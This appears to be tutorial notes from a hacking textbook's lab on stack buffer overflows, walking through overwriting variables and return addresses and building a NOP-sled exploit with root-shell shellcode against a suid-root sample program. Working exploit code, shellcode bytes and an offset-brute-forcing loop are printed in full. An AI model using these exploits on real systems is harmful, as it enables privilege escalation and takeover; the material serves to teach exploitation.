Since so much of hacking is rooted in exploitation and experimentation, the ability to quickly try different things is vital
The BASH shell and Perl are common on most machines and are all that is needed to experiment with exploitatioin

Perl is an interpreted programming language with a print command that happens to be particularly suited to generating long sequences of characters
Perl can be used to execute instructions on the command line by using the -e switch:
__________________________________________________________________________________
reader@hacking:~/booksrc $ perl -e 'print "A" x 20;'
AAAAAAAAAAAAAAAAAAAA
__________________________________________________________________________________

This command tells Perl to execute the commands found between the single quotes--in this case, a single command of print "A" x 20;
This command prints the character A 20 times

Any character, such as a nonprintable character, can alos be printed by using \x## where ## is the hexadecimal value of the character
This notation is used to print the character A, which has hexadecimal value of 0x41
__________________________________________________________________________________
reader@hacking:~/booksrc $ perl -e 'print "\x41" x 20;'
AAAAAAAAAAAAAAAAAAAA
__________________________________________________________________________________

In addition, string concatenation can be done in Perl with a period(.)
__________________________________________________________________________________
reader@hacking:~/booksrc $ perl -e 'print "A"x20 . "BCD" . "\x61\x66\x67\x69"x2 . "Z";'
AAAAAAAAAAAAAAAAAAAABCDafgiafgiZ
__________________________________________________________________________________

An entire shell command can be executed like a function, returning its output in place
This is done by surrounding the command with parentheses and prefixing a dollar sign
__________________________________________________________________________________
reader@hacking:~/booksrc $ $(perl -e 'print "uname";')
Linux
reader@hacking:~/booksrc $ una$(perl -e 'print "m";')e
Linux
__________________________________________________________________________________

In 2nd case, una(m)e
In each case, the output of the command found between the parentheses is substituted for the command, and the command uname is executed
This exact command-substitution effect can be accomplished with grave accent marks(`, the tilted single quote on the tilde key)
However, the parentheses syntax is easier to read for most people
__________________________________________________________________________________
reader@hacking:~/booksrc $ u`perl -e 'print "na";'`me
Linux
reader@hacking:~/booksrc $ u$(perl -e 'print "na";')me
Linux
__________________________________________________________________________________

Command substitution and Perl can be used in combination to quickly generate overflow buffers on the fly
Using this technique to easily test the overflow_example.c program with buffers of precise lengths:

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x30')
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)

[STRCPY] copying 30 bytes into buffer_two

[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAAA'
[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)
Segmentation fault (core dumped)
reader@hacking:~/booksrc $ gdb -q
(gdb) print 0xbffff7f4 - 0xbffff7e0
$1 = 20
(gdb) quit
reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x20 . "ABCD"')
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)

[STRCPY] copying 24 bytes into buffer_two

[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAABCD'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAABCD'
[AFTER] value is at 0xbffff7f4 and is 1145258561 (0x44434241)
__________________________________________________________________________________

In the output above, GDB is used as a hexadecimal calculator to figure out the length between buffer_two(0xbffff7e0) and the value variable (0xbffff7f4), which turns out to be 20 bytes
Using this length, the value variable is overwritten with the exact value 0x44434241, since the characters A, B, C and D have the hex value of 0x41, 0x42, 0x43, and 0x44, respectively
The first character is the least significant byte, due to the little-endian architecture
This means if you wanted to control the value variable with something exact like 0xdeadbeef, you must write those bytes into memory in reverse order
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"')
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)

[STRCPY] copying 24 bytes into buffer_two

[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAA??'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAA??'
[AFTER] value is at 0xbffff7f4 and is -559038737 (0xdeadbeef)
__________________________________________________________________________________

This technique can be applied to overwrite the return address in the auth_overflow2.c program with an exact value
In the below program, we will overwrite the return address with a different address in main()

__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -g -o auth_overflow2 auth_overflow2.c
reader@hacking:~/booksrc $ gdb -q ./auth_overflow2
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) disass main
Dump of assembler code for function main:
0x08048474 <main+0>:        push     ebp 
0x08048475 <main+1>:        mov      ebp,esp 
0x08048477 <main+3>:        sub      esp,0x8 
0x0804847a <main+6>:        and      esp,0xfffffff0 
0x0804847d <main+9>:        mov      eax,0x0 
0x08048482 <main+14>:       sub      esp,eax 
0x08048484 <main+16>:       cmp      DWORD PTR [ebp+8],0x1 
0x08048488 <main+20>:       jg       0x80484ab <main+55> 
0x0804848a <main+22>:       mov      eax,DWORD PTR [ebp+12] 
0x0804848d <main+25>:       mov      eax,DWORD  PTR [eax] 
0x0804848f <main+27>:       mov      DWORD PTR  [esp+4],eax 
0x08048493 <main+31>:       mov      DWORD PTR  [esp],0x80485e5 
0x0804849a <main+38>:       call     0x804831c  <printf@plt> 
0x0804849f <main+43>:       mov      DWORD PTR  [esp],0x0 
0x080484a6 <main+50>:       call     0x804833c  <exit@plt> 
0x080484ab <main+55>:       mov      eax,DWORD  PTR [ebp+12] 
0x080484ae <main+58>:       add      eax,0x4 
0x080484b1 <main+61>:       mov      eax,DWORD  PTR [eax] 
0x080484b3 <main+63>:       mov      DWORD PTR  [esp],eax 
0x080484b6 <main+66>:       call     0x8048414  <check_authentication> 
0x080484bb <main+71>:       test     eax,eax 
0x080484bd <main+73>:       je       0x80484e5  <main+113> 
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
0x080484bf <main+75>:       mov      DWORD PTR  [esp],0x80485fb 
0x080484c6 <main+82>:       call     0x804831c  <printf@plt> 
0x080484cb <main+87>:       mov      DWORD PTR  [esp],0x8048619 
0x080484d2 <main+94>:       call     0x804831c  <printf@plt> 
0x080484d7 <main+99>:       mov      DWORD PTR  [esp],0x8048630 
0x080484de <main+106>:      call     0x804831c  <printf@plt> 
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
0x080484e3 <main+111>:      jmp      0x80484f1  <main+125> 
0x080484e5 <main+113>:      mov      DWORD PTR  [esp],0x804864d 
0x080484ec <main+120>:      call     0x804831c  <printf@plt> 
0x080484f1 <main+125>:      leave     
0x080484f2 <main+126>:      ret     
__________________________________________________________________________________

The code marked above contains the instructions that display the Access Granted message
The beginning of this section is at 0x080484bf, so if the return address is overwritten with this value, this block of instructions will be executed
The exact distance between the return address and the start of the password_buffer can change due to different compiler versions and different optimization flags
As long as the start of the buffer is aligned with DWORDS on the stack, the mutability can be accounted for by simply repeating the return address many times
This way, at least one of the instances will overwrite the return address, even if it has shifted around due to compiler optimizations
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./auth_overflow2 $(perl -e 'print "\xbf\x84\x04\x08"x10')
-=-=-=-=-=-=-=-=-=-=-=-=-=-
Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
Segmentation fault (core dumped)
__________________________________________________________________________________

In the example above, the target address of 0x080484bf is repeated 10 times to ensure the return address is overwritten with the new target address
When the check_authentication() function returns, execution jumps directly to the new target address instead of returning to the next instruction after the call
This gives us more control; however, we are still limited to using instructions that exist in the original programming

The notesearch program is vulnerable to a buffer overflow on the line marked below:
__________________________________________________________________________________
int main(int argc, char *argv[]) {
    int userid, printing =1, fd; // File descriptor
    char searchstring[100];

    if(argc > 1) //If there is an arg,
        ***|---strcpy(searchstring, argv[1]);---|*** //that is the search string
    else
        searchstring[0] = 0;
__________________________________________________________________________________

The notesearch exploit uses a similar technique to overflow a buffer into the return address; however, it also injects its own instructions into memory and then returns execution there
These instructions are called shellcode, and they tell the program to restore privileges and open a shell prompt
This is especially devastating for the notesearch program, since it is suid root
Since the program expects multiuser access, it runs under higher privileges so it can access its data file, but the program logic prevents the user from using these higher privileges for anything other than accessing the data file--at least that's the intention

But when new instructions can be injected in and execution can be controlled with a buffer overflow, the program logic is meaningless
This technique allows the program to do things it was never programmed to do, while it's still running with elevated privileges
This is the dangerous combination that allows the notesearch exploit to gain a root shell

__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -g exploit_notesearch.c
reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) list 1
1       #include <stdio.h> 
2       #include <stdlib.h> 
3       #include <string.h> 
4       char shellcode[]= 
5       "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68" 
6       "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89" 
7       "\xe1\xcd\x80"; 
8     
9       int main(int argc, char *argv[]) { 
10          unsigned int i, *ptr, ret, offset=270; 
(gdb)
11          char *command, *buffer; 
12     
13          command = (char *) malloc(200); 
14          bzero(command, 200); // Zero out the new memory. 
15     
16          strcpy(command, "./notesearch \'"); // Start command buffer. 
17          buffer = command + strlen(command); // Set buffer at the end. 
18     
19          if(argc > 1) // Set offset. 
20                 offset = atoi(argv[1]);
(gdb)
21     
22          ret = (unsigned int) &i - offset; // Set return address. 
23     
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
24          for(i=0; i < 160; i+=4) // Fill buffer with return address. 
25                 *((unsigned int *)(buffer+i)) = ret; 
26          memset(buffer, 0x90, 60); // Build NOP sled. 
27          memcpy(buffer+60, shellcode, sizeof(shellcode)-1); 
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
28     
29          strcat(command, "\'"); 
30     
(gdb) break 26
Breakpoint 1 at 0x80485fa: file exploit_notesearch.c, line 26.
(gdb) break 27
Breakpoint 2 at 0x8048615: file exploit_notesearch.c, line 27.
(gdb) break 28
Breakpoint 3 at 0x8048633: file exploit_notesearch.c, line 28.
__________________________________________________________________________________

The notesearch exploit generates a buffer in lines 24 through 27
The first part is a for loop that fills the buffer with a 4-byte address stored in the ret variable
The loop increases i by 4 each time
This value is added to the buffer address, and the whole thing is typecasted as a unsigned integer pointer
This has a size of 4, so when the whole thing is dereferenced, the entire 4-byte value found in ret is written

__________________________________________________________________________________
(gdb) run
Starting program: /home/reader/booksrc/a.out
Breakpoint 1, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:26
26        memset(buffer, 0x90, 60); // build NOP sled
(gdb) x/40x buffer
0x804a016:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a026:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a036:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a046:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a056:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a066:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
(gdb) x/s command
0x804a008:       "./notesearch '¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿"
__________________________________________________________________________________

At the first breakpoint, the buffer pointer shows the result of the for loop
You can also see the relationship between the command pointer and the buffer overflow
The next instruction is a call to memset(), which starts at the beginning of the buffer and sets 60 bytes of memory with tht value 0x90

__________________________________________________________________________________
(gdb) cont
Continuing.

Breakpoint 2, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:27
27          memcpy(buffer+60, shellcode, sizeof(shellcode)-1);
(gdb) x/40x buffer
0x804a016:      0x90909090      0x90909090      0x90909090      0x90909090 
0x804a026:      0x90909090      0x90909090      0x90909090      0x90909090 
0x804a036:      0x90909090      0x90909090      0x90909090      0x90909090 
0x804a046:      0x90909090      0x90909090      0x90909090      0xbffff6f6 
0x804a056:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a066:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
(gdb) x/s command
0x804a008:      "./notesearch '", '\220' <repeats 60 times>, "¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿
¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿"
__________________________________________________________________________________

Finally, the call to memcpy() will copy the shellcode bytes into buffer+60

__________________________________________________________________________________
(gdb) cont      Continuing.
Breakpoint 3, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:29
29              strcat(command, "\'");
(gdb) x/40x buffer
0x804a016:      0x90909090      0x90909090      0x90909090      0x90909090 
0x804a026:      0x90909090      0x90909090      0x90909090      0x90909090 
0x804a036:      0x90909090      0x90909090      0x90909090      0x90909090 
0x804a046:      0x90909090      0x90909090      0x90909090      0x3158466a 
0x804a056:      0xcdc931db      0x2f685180      0x6868732f      0x6e69622f 
0x804a066:      0x5351e389      0xb099e189      0xbf80cd0b      0xbffff6f6 
0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6 
(gdb) x/s command
0x804a008:      "./notesearch '", '\220' <repeats 60 times>, "1À1Û1É\231°¤Í\200j\vXQh//shh/bin\211ãQ\211âS\211áÍ\200¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿"
__________________________________________________________________________________

Now the buffer contains the desired shellcode and is long enough to overwrite the return address
The difficulty of finding the exact location of the return address is eased by using the repeated return address technique
But this return address must point to the shellcode located in the same buffer
This means the actual address must be known ahead of time, before it even goes into memory
This can be a difficult prediction to try to make with a dynamically changing stack
Fortunately, there is another hacking technique, called the NOP sled, that can assist with this difficult chicanery

NOP is an assembly instruction that is short for no operation
It is a single-byte instruction that does absolutely nothing
These instructions are sometimes used to waste computational cycles for timing purposes and are actually necessary in the Sparc processor architecture, due to instruction pipelining
In this case, NOP instructions are going to be used for a different purpose: as a fudge factor
We'll create a large array(or sled) of these NOP instructions and place it before the shellcode; then, if the EIP register points to any address found in the NOP sled, it will increment while executing each NOP instruction, one at a time, until it finally reaches the shellcode
This means that as long as the return address is overwritten with any address found in the NOP sled, the EIP register will slide down the sled to the shellcode, which will execute properly
On the x86 architecture, the NOP instruction is equivalent to the hex byte 0x90
This means our completed exploit buffer looks something like this:
_____________________________________________________
|  NOP sled  |  Shellcode  |  Repeated return address|
|____________|_____________|_________________________|

Even with a NOP sled, the approximate location of the buffer in memory must be predicted in advance
One technique for approximating the memory location is to use a nearby stack location as a frame of reference
By subtracting an offset from this location, the relative address of any variable can be obtained

From exploit_notesearch.c
__________________________________________________________________________________
unsigned int i, *ptr, ret, offset=270;
char *command, *buffer;

command = (char *) malloc(200);
bzero(command, 200); // Zero out the new memory.

strcpy(command, "./notesearch \'"); // Start command buffer.
buffer = command + strlen(command); // Set buffer at the end.

if(argc > 1) // Set offset.
    offset = atoi(argv[1]);

ret = (unsigned int) &i - offset; // Set return address.
__________________________________________________________________________________

In the notesearch exploit, the address of the variable i in main()'s stack frame is used as a point of reference
Then an offset is subtracted from that value; the result is the target return address
This offset was previously determined to be 270, but how is the number calcualted?

The easiset way to determine this offset is experimentally
The debugger will shift memory around slightly and will drop privileges when the suid root notesearch program is executed, making debugging much less useful in this case

Since the notesearch exploit allows an optional command-line argument to define the offset, different offsets can quickly be tested

__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc exploit_notesearch.c
reader@hacking:~/booksrc $ ./a.out 100
-------[ end of note data ]-------
reader@hacking:~/booksrc $ ./a.out 200
-------[ end of note data ]-------
__________________________________________________________________________________

However, doing this manually is tedious and stupid
BASH also has a for loop that can be used to automate this process
The seq command is a simple program that generates sequences of numbers, which is typically used with looping

__________________________________________________________________________________
reader@hacking:~/booksrc $ seq 1 10
1
2
3
4
5
6
7
8
9
10
reader@hacking:~/booksrc $ seq 1 3 10
1
4
7
10
__________________________________________________________________________________

When only 2 arguments are used, all the numbers from the first argument to the second are generated
When 3 arguments are used, the middle argument is used as a step(dictates how much to increase each time)
This can be used with command substitution to drive BASH's for loop:

__________________________________________________________________________________
reader@hacking:~/booksrc $ for i in $(seq 1 3 10)
> do
> echo The value is $i
> done
The value is 1
The value is 4
The value is 7
The value is 10
__________________________________________________________________________________

The shell variable $i iterates through all variables found in  the grave accents(generated by seq)
Then everything between the do and done keyword is executed
This can be used to quickly test many different offsets
Since the NOP is 60 bytes long, and we can return anywhere on the sled, there is about 60 bytes of wiggle room
We can safely increment the offset loop with a step of 30 with no danger of missing the sled

__________________________________________________________________________________
reader@hacking:~/booksrc $ for i in $(seq 0 30 300)
> do
> echo Trying offset $i
> ./a.out $i
> done
Trying offset 0
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
__________________________________________________________________________________

When the right offset is used, the return address is overwritten with a value that points somewhere on the NOP sled
When execution tries to return to that location, it will slide down the NOP slide into the injected shellcode instructions
This is how the default offset value was discovered